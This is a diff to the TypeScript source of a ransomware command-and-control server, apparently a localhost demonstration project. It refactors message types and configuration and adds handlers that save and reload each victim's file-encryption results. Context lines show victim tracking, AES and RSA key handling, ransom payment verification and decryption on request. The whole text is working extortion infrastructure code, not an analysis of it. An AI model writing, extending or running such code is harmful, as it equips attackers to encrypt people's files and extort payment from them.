@@ -6,23 +6,13 @@ import crypto from 'crypto'
 import fs from 'fs'
 import path from 'path'
 import { generateRSAKeys, encryptRSA, decryptRSA } from './rsaComm'
-
-// Server configuration
-const SERVER_PORT = 4444
-const SERVER_HOST = '127.0.0.1' // localhost - only for demonstration
-
-// Store victim information and encryption keys
-interface VictimInfo {
-    victimId: string
-    aesKey: Buffer
-    encryptedAESKey: Buffer
-    publicKey: string
-    privateKey: string
-    infected: Date
-    ipAddress: string
-    paymentStatus: 'pending' | 'paid'
-    ivMap: Map<string, Buffer> // Maps file paths to their IVs
-}
+import { 
+    MessageType, 
+    ServerMessage, 
+    VictimInfo, 
+    SERVER_CONFIG, 
+    PaymentStatus 
+} from './types/communication'
 
 // In-memory storage of victim information
 // In a real malicious scenario, this would be stored in a database
@@ -31,26 +21,9 @@ const victims = new Map<string, VictimInfo>()
 // Create server instance
 const server = net.createServer()
 
-// Message types for client-server communication
-enum MessageType {
-    INITIALIZE = 'INITIALIZE',
-    STORE_IV = 'STORE_IV',
-    ENCRYPT_KEY = 'ENCRYPT_KEY',
-    DECRYPT_REQUEST = 'DECRYPT_REQUEST',
-    PAYMENT_VERIFICATION = 'PAYMENT_VERIFICATION'
-}
-
-interface ServerMessage {
-    type: string
-    victimId?: string
-    publicKey?: string
-    aesKey?: string // Base64 encoded
-    encryptedAESKey?: string // Base64 encoded
-    privateKey?: string
-    success?: boolean
-    message?: string
-    iv?: string // Base64 encoded
-    filePath?: string
+// Ensure results directory exists
+if (!fs.existsSync(SERVER_CONFIG.RESULTS_DIR)) {
+    fs.mkdirSync(SERVER_CONFIG.RESULTS_DIR, { recursive: true })
 }
 
 // Generate a unique ID for the victim
@@ -128,8 +101,7 @@ server.on('connection', (socket) => {
                         response = handlePaymentVerification(
                             message.victimId,
                             message.message // transaction ID
-                        )
-                    }
+                        )                    }
                     break
 
                 case MessageType.DECRYPT_REQUEST:
@@ -140,6 +112,32 @@ server.on('connection', (socket) => {
                         }
                     } else {
                         response = handleDecryptRequest(message.victimId)
+                    }
+                    break
+
+                case MessageType.STORE_ENCRYPTION_RESULTS:
+                    if (!currentVictimId || !message.encryptionResults || !message.targetDirectory) {
+                        response = {
+                            type: 'ERROR',
+                            message: 'Missing victim ID, encryption results, or target directory'
+                        }
+                    } else {
+                        response = handleStoreEncryptionResults(
+                            currentVictimId,
+                            message.encryptionResults,
+                            message.targetDirectory
+                        )
+                    }
+                    break
+
+                case MessageType.LOAD_ENCRYPTION_RESULTS:
+                    if (!message.victimId) {
+                        response = {
+                            type: 'ERROR',
+                            message: 'Missing victim ID'
+                        }
+                    } else {
+                        response = handleLoadEncryptionResults(message.victimId)
                     }
                     break
 
@@ -280,7 +278,7 @@ function handleEncryptKey(victimId: string): ServerMessage {
             type: 'ERROR',
             message: 'Victim ID not found'
         }
-    }    // Encrypt the AES key with the victim's public key
+    } // Encrypt the AES key with the victim's public key
     // Convert AES key from Buffer to string for RSA encryption
     const aesKeyString = victim.aesKey.toString('hex')
     const encryptedAESKey = encryptRSA(aesKeyString, victim.publicKey)
@@ -371,6 +369,106 @@ function handleDecryptRequest(victimId: string): ServerMessage {
     }
 }
 
+// Handle storing encryption results on the server
+function handleStoreEncryptionResults(
+    victimId: string,
+    encryptionResultsBase64: string,
+    targetDirectory: string
+): ServerMessage {
+    const victim = victims.get(victimId)
+    if (!victim) {
+        return {
+            type: 'ERROR',
+            message: 'Victim not found'
+        }
+    }
+
+    try {
+        // Decode the encryption results
+        const encryptionResultsBuffer = Buffer.from(encryptionResultsBase64, 'base64')
+        const encryptionResults = JSON.parse(encryptionResultsBuffer.toString())
+        
+        // Store in victim data
+        victim.encryptionResults = encryptionResults
+        victim.targetDirectory = targetDirectory
+        
+        // Save to results directory with victim ID
+        const resultsFilePath = path.join(SERVER_CONFIG.RESULTS_DIR, `${victimId}_encryption_results.json`)
+        fs.writeFileSync(resultsFilePath, JSON.stringify({
+            victimId,
+            targetDirectory,
+            encryptionResults,
+            timestamp: new Date().toISOString()
+        }, null, 2))
+        
+        console.log(`[+] Stored encryption results for victim ${victimId} in ${resultsFilePath}`)
+        
+        return {
+            type: 'SUCCESS',
+            success: true,
+            message: 'Encryption results stored successfully'
+        }
+    } catch (error) {
+        console.error(`[-] Failed to store encryption results for victim ${victimId}:`, error)
+        return {
+            type: 'ERROR',
+            message: 'Failed to store encryption results'
+        }
+    }
+}
+
+// Handle loading encryption results from the server
+function handleLoadEncryptionResults(victimId: string): ServerMessage {
+    const victim = victims.get(victimId)
+    if (!victim) {
+        return {
+            type: 'ERROR',
+            message: 'Victim not found'
+        }
+    }
+
+    try {
+        // Try to load from memory first
+        if (victim.encryptionResults) {
+            console.log(`[+] Loading encryption results from memory for victim ${victimId}`)
+            return {
+                type: 'SUCCESS',
+                success: true,
+                encryptionResults: Buffer.from(JSON.stringify(victim.encryptionResults)).toString('base64')
+            }
+        }
+        
+        // Load from file if not in memory
+        const resultsFilePath = path.join(SERVER_CONFIG.RESULTS_DIR, `${victimId}_encryption_results.json`)
+        if (fs.existsSync(resultsFilePath)) {
+            const fileContent = fs.readFileSync(resultsFilePath, 'utf8')
+            const data = JSON.parse(fileContent)
+            
+            // Update victim data
+            victim.encryptionResults = data.encryptionResults
+            victim.targetDirectory = data.targetDirectory
+            
+            console.log(`[+] Loaded encryption results from file for victim ${victimId}`)
+            return {
+                type: 'SUCCESS',
+                success: true,
+                encryptionResults: Buffer.from(JSON.stringify(data.encryptionResults)).toString('base64')
+            }
+        }
+        
+        return {
+            type: 'ERROR',
+            message: 'No encryption results found for this victim'
+        }
+    } catch (error) {
+        console.error(`[-] Failed to load encryption results for victim ${victimId}:`, error)
+        return {
+            type: 'ERROR',
+            message: 'Failed to load encryption results'
+        }
+    }
+}
+
 // Log current victim status
 function logVictimStatus(): void {
     console.log('\n=== Current Victims ===')
@@ -445,8 +543,8 @@ if (!fs.existsSync(RESULTS_DIR)) {
 }
 
 // Start the server
-server.listen(SERVER_PORT, SERVER_HOST, () => {
-    console.log(`[+] C2 Server running on ${SERVER_HOST}:${SERVER_PORT}`)
+server.listen(SERVER_CONFIG.PORT, SERVER_CONFIG.HOST, () => {
+    console.log(`[+] C2 Server running on ${SERVER_CONFIG.HOST}:${SERVER_CONFIG.PORT}`)
     console.log('[+] Waiting for victim connections...')
 })
 
